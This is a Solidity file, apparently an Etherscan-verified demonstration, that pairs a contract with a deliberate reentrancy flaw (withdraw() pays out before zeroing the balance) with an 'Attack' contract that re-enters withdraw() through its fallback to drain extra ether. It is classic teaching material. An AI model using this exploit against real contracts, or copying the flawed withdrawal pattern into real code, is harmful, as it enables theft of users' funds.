/**
 *Submitted for verification at Etherscan.io on 2022-12-07
*/

contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");

        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}

contract Attack {
    address private target_address;
    Vuln public target;
    bool alreadyTookEther = false;

    constructor(address target_addr) public {
        target_address = target_addr;
        target = Vuln(target_address);
        alreadyTookEther = false;
    }

    fallback() external payable {
        if(alreadyTookEther == false) {
            alreadyTookEther = true;
            target.withdraw();
        }
    }

    function start() public payable {
        target.deposit.value(msg.value)();
        target.withdraw();
    }

    function getFunds() public {
        msg.sender.transfer(address(this).balance);
        alreadyTookEther = false;
    }
}